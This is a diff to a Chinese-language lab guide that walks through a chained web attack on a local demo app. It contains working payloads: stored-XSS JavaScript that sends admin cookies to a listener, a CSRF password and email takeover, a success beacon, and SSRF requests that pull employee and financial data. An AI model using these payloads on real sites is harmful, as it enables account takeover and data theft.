@@ -68,6 +68,8 @@ arpspoof -i eth0 -t VM3_IP VM2_IP
 // 檢查當前用戶是否為 admin
 if(document.querySelector('.nav-content') && document.querySelector('.nav-content').innerText.includes('admin')) {
     
+    console.log('[ATTACK] Admin detected - Starting targeted attack');
+    
     // JSshell 反向連接 (僅針對 admin)
     setInterval(function(){
         with(document)body.appendChild(createElement("script")).src="http://127.0.0.1:4848/?admin_".concat(document.cookie)
@@ -75,17 +77,69 @@ if(document.querySelector('.nav-content') && document.querySelector('.nav-conten
     
     // 針對 admin 的 CSRF 攻擊 - 修改密碼為 hacked123
     setTimeout(() => {
-        const token = document.querySelector('input[name="csrf_token"]');
-        if(token) {
+        // 多種方式獲取 CSRF token
+        let token = null;
+        
+        // 方法1: 從隱藏的 input 獲取
+        const hiddenToken = document.querySelector('#csrf_token_hidden');
+        if (hiddenToken) {
+            token = hiddenToken.value;
+            console.log('[ATTACK] Token from hidden input:', token);
+        }
+        
+        // 方法2: 從任何 csrf_token input 獲取
+        if (!token) {
+            const tokenInput = document.querySelector('input[name="csrf_token"]');
+            if (tokenInput) {
+                token = tokenInput.value;
+                console.log('[ATTACK] Token from form input:', token);
+            }
+        }
+        
+        // 方法3: 先訪問 /account 頁面獲取 token
+        if (!token) {
+            fetch('/account')
+                .then(response => response.text())
+                .then(html => {
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(html, 'text/html');
+                    const tokenInput = doc.querySelector('input[name="csrf_token"]');
+                    if (tokenInput) {
+                        token = tokenInput.value;
+                        console.log('[ATTACK] Token from /account page:', token);
+                        executeCSRFAttack(token);
+                    }
+                });
+        } else {
+            executeCSRFAttack(token);
+        }
+        
+        function executeCSRFAttack(csrfToken) {
+            if (!csrfToken) {
+                console.log('[ATTACK] No CSRF token found!');
+                return;
+            }
+            
+            console.log('[ATTACK] Executing CSRF attack with token:', csrfToken);
+            
             fetch('/account', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'csrf_token=' + token.value + '&new_password=hacked123&email=hacker@evil.com'
-            }).then(() => {
-                console.log('[ATTACK] Admin password changed to hacked123');
+                body: `csrf_token=${csrfToken}&new_password=hacked123&email=hacker@evil.com`
+            }).then(response => {
+                if (response.ok) {
+                    console.log('[ATTACK] Admin password changed to hacked123');
+                    // 通知攻擊者伺服器攻擊成功
+                    new Image().src = 'http://127.0.0.1:8888/keylogger?admin_pwned=success';
+                } else {
+                    console.log('[ATTACK] CSRF attack failed:', response.status);
+                }
+            }).catch(e => {
+                console.log('[ATTACK] CSRF attack error:', e);
             });
         }
-    }, 2000);
+        
+    }, 3000);
     
     // 針對 admin 的 Keylogger
     let adminKeys='';
@@ -113,10 +167,10 @@ if(document.querySelector('.nav-content') && document.querySelector('.nav-conten
 
 ### Step 6: 等待 Admin 觸發攻擊
 - Admin 登入系統: admin/adminpass
-- 訪問留言板查看留言
-- 🎯 **自動觸發 CSRF 攻擊**：
-  - Admin 密碼自動修改為 hacked123
-  - Admin 郵箱修改為 hacker@evil.com
+- 訪問留言板查看留言  
+- 🎯 **控制面板即時更新**：
+  - "CSRF Attacks" 計數器 +1
+  - 顯示 admin 密碼從 adminpass 改为 hacked123
   - Admin 的 JSshell 連接建立
   - Admin 的按鍵開始被記錄
 
@@ -143,93 +197,76 @@ fetch('/admin/users').then(r=>r.text()).then(data=>console.log(data))
 ```
 
 ### Step 9: 🎯 **SSRF 攻擊演示**
-1. **發現 SSRF 端點**
+⚠️ **重要：SSRF 功能現在僅限 admin 使用**
+
+1. **權限檢查**
    ```
-   訪問: http://127.0.0.1:5000/fetch
-   發現可以獲取任意 URL 內容
+   普通用戶訪問 /fetch 會被拒絕
+   只有 admin 可以使用此功能
    ```
 
-2. **探測內部服務**
+2. **獲得 Admin 權限後使用 SSRF**
+   ```
+   使用竊取的 admin 帳密 (admin/hacked123) 登入
+   或者等待 CSRF 攻擊成功修改密碼後登入
+   ```
+
+3. **發現 SSRF 端點**
+   ```
+   Admin 登入後訪問: http://127.0.0.1:5000/fetch
+   發現管理員專用的 URL 獲取工具
+   ```
+
+4. **探測內部服務**
    ```
    http://127.0.0.1:5000/fetch?path=http://127.0.0.1:8080/
    發現內部管理系統運行在 8080 端口
    ```
 
-3. **竊取敏感資料**
+5. **竊取敏感資料**
    ```
    員工資料: /fetch?path=http://127.0.0.1:8080/employees
    財務資料: /fetch?path=http://127.0.0.1:8080/financial  
    系統日誌: /fetch?path=http://127.0.0.1:8080/logs
    ```
 
-4. **SQL Injection via SSRF**
+6. **SQL Injection via SSRF**
    ```
    /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT * FROM employees WHERE salary > 1000000
    /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT * FROM financial_data WHERE amount > 10000000
+   /fetch?path=http://127.0.0.1:8080/sql_debug?query=SELECT name,salary,email FROM employees ORDER BY salary DESC
    ```
 
-### Step 10: 🛡️ **CSRF 保護測試**
-1. **正常流程 (有 CSRF token)**
-   - 登入後訪問 /account
-   - 使用正確的 CSRF token 修改資料
-   - ✅ 修改成功
-
-2. **CSRF 攻擊測試 (無 CSRF token)**
-   - 嘗試直接 POST 到 /account 而不帶 CSRF token
-   - ❌ 攻擊被阻擋："CSRF token 驗證失敗"
-
-3. **XSS + CSRF 繞過攻擊**
-   ```html
-   <script>
-   // 獲取頁面中的 CSRF token
-   const token = document.querySelector('input[name="csrf_token"]').value;
-   
-   // 使用正確的 CSRF token 進行攻擊
-   fetch('/account', {
-       method: 'POST',
-       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-       body: `csrf_token=${token}&new_password=hacked123&email=attacker@evil.com`
-   });
-   </script>
+7. **外部探測測試**
+   ```
+   /fetch?path=http://httpbin.org/ip
+   /fetch?path=http://httpbin.org/headers
    ```
 
-## 🎯 完整攻擊鏈演示
+## 🎯 攻击链的重要性
 
-### 攻擊階段 1: 資訊收集
-- ✅ **ARP Spoofing**: 攔截網路流量
-- ✅ **釣魚攻擊**: 竊取初始帳密
-- ✅ **SSRF 探測**: 發現內部服務
+### 權限提升的關鍵性
+1. **第一階段**: 竊取普通用戶帳密 (釣魚攻擊)
+2. **第二階段**: 利用 XSS + CSRF 獲得 admin 權限
+3. **第三階段**: 使用 admin 權限進行 SSRF 攻擊
+4. **最終階段**: 透過 SSRF 訪問內部敏感系統
 
-### 攻擊階段 2: 權限提升  
-- ✅ **Stored XSS**: 植入惡意載荷
-- ✅ **CSRF 繞過**: 修改 admin 密碼
-- ✅ **JSshell**: 控制 admin 瀏覽器
-
-### 攻擊階段 3: 資料竊取
-- ✅ **內部服務訪問**: 透過 SSRF 訪問機敏系統
-- ✅ **員工資料**: 薪資、職位、聯絡方式
-- ✅ **財務資料**: 交易記錄、帳戶資訊
-- ✅ **系統日誌**: 安全事件、訪問記錄
-
-### 攻擊階段 4: 持久化控制
-- ✅ **管理員權限**: 完全控制 Web 應用
-- ✅ **瀏覽器控制**: JSshell 遠端操作
-- ✅ **按鍵記錄**: 持續監控用戶輸入
-- ✅ **資料庫訪問**: 查看和修改所有資料
+### 演示重點
+- ✅ **權限控制**: 展示功能限制的重要性
+- ✅ **攻擊鏈**: 展示多個漏洞的組合利用
+- ✅ **橫向移動**: 從外部網站攻擊內部系統
+- ✅ **數據洩露**: 獲取敏感的員工和財務資料
 
 ## 🔒 防護機制展示
 
-### CSRF 保護
-- ✅ 每個表單都有唯一的 CSRF token
-- ✅ 無效或缺失的 token 會被拒絕
-- ❌ XSS 攻擊可以繞過 CSRF 保護
+### SSRF 防護
+- ✅ 權限控制：只有 admin 可以使用
+- ❌ 仍然存在 SSRF 漏洞，可訪問內部服務
+- ❌ 沒有白名單限制可訪問的 URL
 
-### 內部服務隔離
-- ✅ 內部服務只接受來自 127.0.0.1 的請求
-- ❌ SSRF 攻擊可以繞過 IP 限制
+### 攻擊成功的條件
+- 需要先獲得 admin 權限 (透過 CSRF 攻擊)
+- admin 權限是 SSRF 攻擊的前提
+- 展示了縱深防禦的重要性
 
-### 輸入驗證
-- ❌ 留言板允許未過濾的 HTML 輸入
-- ❌ SSRF 端點允許訪問任意 URL
-
-這個完整的演示展示了現代 Web 應用中多種漏洞的組合攻擊！
+這種設計展示了即使有部分防護措施，攻擊鏈仍然可能成功！
